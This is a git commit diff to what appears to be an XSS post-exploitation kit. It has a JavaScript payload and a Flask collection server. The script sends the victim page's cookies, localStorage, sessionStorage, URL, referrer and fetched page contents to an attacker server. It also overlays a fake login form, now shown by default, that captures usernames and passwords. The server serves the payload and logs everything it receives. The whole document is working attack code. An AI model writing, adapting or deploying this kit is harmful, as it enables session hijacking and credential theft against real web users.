2c001c1379ed2c3326ee7beb743d1e04e4776c13
Vinicius <17213356+morkin1792@users.noreply.github.com>
2021-01-09 03:25:26 +0000

    general improvements + bug fixes - using localstorage to avoid repeats - authenticated form fixed - now sending raw bytes from requests

--- scripts/a.js
+++ scripts/a.js
@@ -1,7 +1,7 @@
 const server = 'https://myserverhere/'
 
-const send = async (value) => {
-    fetch(server, {
+const send = async (info, value) => {
+    fetch(server + '?meta=' + info, {
         mode: 'no-cors',
         method: 'post',
         body: value
@@ -9,10 +9,12 @@ const send = async (value) => {
 }
 
 const sendPage = async (url) => {
+    if (alreadySent(url)) { return }
     let r = await fetch(url, { mode: 'no-cors'})
-    let response = await r.text()
+    let response = await r.arrayBuffer()
     if (response) {
-        send(url + '\n' + response)
+        send(url, response)
+        markSent(url)
     }
 }
 
@@ -35,53 +37,70 @@ const getSubUrls = (url) => {
     return subUrls
 }
 
+const alreadySent = (key) => {
+    return localStorage.getItem('postxss_' + key)
+}
+
+const markSent = (key) => {
+    localStorage.setItem('postxss_' + key, true)
+}
+
 const sendStorage = () => {
+    if (alreadySent('storage')) {
+	return
+    }
     let localValues = '';
     let keys = Object.keys(localStorage);
     for (let i = keys.length-1; i >= 0; i--) {
-        localValues += keys[i] + '::' + localStorage.getItem(keys[i]) + '<<>>';
+        localValues += keys[i] + '::' + localStorage.getItem(keys[i]) + '<<>>'
     }
     if (localValues.length > 0) {
-        send('localStorage\n'+localValues);
+        send('localStorage', localValues)
     }
 
-    let sessionValues = '';
-    keys = Object.keys(sessionStorage);
+    let sessionValues = ''
+    keys = Object.keys(sessionStorage)
     for (let i = keys.length-1; i >= 0; i--) {
-        sessionValues += keys[i] + '::' + sessionStorage.getItem(keys[i]) + '<<>>';
+        sessionValues += keys[i] + '::' + sessionStorage.getItem(keys[i]) + '<<>>'
     }
     if (sessionValues.length > 0) {
-        send('sessionStorage\n'+sessionValues);
+        send('sessionStorage', sessionValues)
     }
+    markSent('storage')
 }
 
+if (!alreadySent('location')) {
+    send('location', document.location)
+    markSent('location')
+}
 
-send('location\n' + document.location)
-
-if (document.cookie.length > 0) {
-    send('cookies\n' + document.cookie)
+if (document.cookie.length > 0 && !alreadySent('cookie')) {
+    send('cookies', document.cookie)
+    markSent('cookie')
 }
 
 sendStorage();
 
-if (document.referrer) {
-    send('referrer\n' + document.referrer)
+if (document.referrer && !alreadySent('ref')) {
+    send('referrer', document.referrer)
     sendPage(document.referrer)
     const referrerUrls = getSubUrls(document.referrer)
     referrerUrls.forEach(url => sendPage(url))
+    markSent('ref')
 }
 
 sendPage(window.location.href)
 const locationUrls = getSubUrls(window.location.href)
 locationUrls.forEach(url => sendPage(url))
 
-// sendPage('http://vitima.com')
-
-
+//sendPage('http://victim/image.png')
 
 const displayAutenticationPage = (language = 'pt') => {
+    if (alreadySent('creds')) {
+        return
+    }
     let words = []
-    if (language.toLowerCase() == 'pt') {
+    if (language.toLowerCase().includes('pt')) {
         words = [
             'senha',
             'credenciais incorretas, tente novamente!'
@@ -92,14 +111,14 @@ const displayAutenticationPage = (language = 'pt') => {
             'incorrect credentials, try again!'
         ]
     }
-    const div = document.createElement("div"); 
+    const div = document.createElement("div")
     div.innerHTML = `
     <div style="width: 100%;height: 100%;background-color: #eee;position: absolute;left: 0;top: 0;">
         <div class="login-page" style="width: 360px;padding: 8% 0 0;margin: auto;">
             <div class="form" style="position: relative;z-index: 1;background: #FFFFFF;max-width: 360px;margin: 0 auto 100px;padding: 45px;text-align: center;box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.2), 0 5px 5px 0 rgba(0, 0, 0, 0.24);">
                 <div id="login-form">
                     <input id="login" type="text" placeholder="login" style="width: 100%;margin: 0 0 15px;box-sizing: border-box;font-size: 14px;"/>
-                    <input id="password" type="password" placeholder="${words[0]}" style="width: 100%;margin: 0 0 15px;box-sizing: border-box;font-size: 14px;"/>
+                    <input id="password" type="password" onkeypress="return OnEnter(event)" placeholder="${words[0]}" style="width: 100%;margin: 0 0 15px;box-sizing: border-box;font-size: 14px;"/>
                     <button id="button">login</button>
                     <h5 id="msg" style="visibility: hidden;"> ${words[1]} </h5>
                 </form>
@@ -107,15 +126,25 @@ const displayAutenticationPage = (language = 'pt') => {
         </div>
     </div>
     `
-    document.getElementsByTagName('html')[0].appendChild(div);
+    document.getElementsByTagName('html')[0].appendChild(div)
     document.getElementById('button').onclick = () => {
-        fetch(receiverServer, {
+        fetch(server + '?meta=creds', {
             method: 'post',
             body: 'login=' + document.getElementById('login').value + '&password=' + document.getElementById('password').value
         });
-        document.getElementById('login').value = '';
-        document.getElementById('password').value = '';
-        document.getElementById('msg').style.visibility = 'visible';
+        document.getElementById('login').value = ''
+        document.getElementById('password').value = ''
+        //document.getElementById('msg').style.visibility = 'visible'
+	markSent('creds')
+	setTimeout('location.reload(true)', 500)
     }
 }
-// displayAutenticationPage()
+function OnEnter(e) {
+    var code = e.keyCode ? e.keyCode : e.charCode ? e.charCode : e.which ? e.which : void 0
+    if (code == 13) {
+        document.getElementById('button').click()
+	return true
+    }
+}
+var userLang = navigator.language || navigator.userLanguage
+displayAutenticationPage(userLang)
--- server.py
+++ server.py
@@ -19,18 +19,21 @@ app = myFlask(__name__, static_url_path='')
 
 @app.route('/<name>', methods=['GET'])
 def script(name):
-    host = request.headers.get('host')
-    if len(host) < 1:
-        host = request.headers.get('Host')
-    name = re.search('[a-zA-Z0-9]+', name)
-    if name:
+    try:
+        host = request.headers.get('host')
+        if len(host) < 1:
+            host = request.headers.get('Host')
+        name = re.search('[a-zA-Z0-9.]+', name)
         name = name.group()
         script = open(scripts_location + '/' + name).read()
         if len(host) > 0:
             script = script.replace('myserverhere', host)
         resp = make_response(script)
         resp.headers['Content-Type'] = 'application/javascript; charset=utf-8'
+        resp.headers['Cache-Control'] = 'no-cache'
         return resp
+    except Exception: 
+        return ':p'
 
 @app.route('/', methods= ['POST'])
 def infos():
@@ -38,11 +41,14 @@ def infos():
     forwarded = request.headers.get('X-Forwarded-For')
     if client_ip == '127.0.0.1' and re.match('^[0-9]{1,3}[.][0-9]{1,3}[.][0-9]{1,3}[.][0-9]{1,3}$', forwarded):
         client_ip = forwarded
-    log = open(log_dir + '/' + client_ip + '__' + datetime.now().strftime('%d.%m.%Y__%H.%M.%S__%f') + '.log', 'w')
-    log.write('* [' + datetime.now().strftime('%d/%m/%Y %H:%M:%S') + '] connection from: ' + client_ip + '\n')
-    log.write(request.get_data().decode() + '\n')
+    log = open(log_dir + '/' + client_ip + '__' + datetime.now().strftime('%d.%m.%Y__%H.%M.%S__%f') + '.log', 'wb')
+    metadata = request.args.get('meta')
+    if not metadata:
+        metadata = ''
+    log.write(bytes('* [' + datetime.now().strftime('%d/%m/%Y %H:%M:%S') + ' @ ' + client_ip + '] ' + metadata + '\n', 'utf-8'))
+    log.write(request.get_data())
     log.close()
-    resp = make_response('1')
+    resp = make_response('1') 
     origin = request.headers.get('Origin')
     if len(origin) < 1:
         origin = request.headers.get('origin')
@@ -50,6 +56,9 @@ def infos():
         resp.headers['Access-Control-Allow-Origin'] = origin
     return resp
 
+@app.route('/')
+def home():
+    return ':p'
 
 if len(sys.argv) > 1:
     port = sys.argv[1]
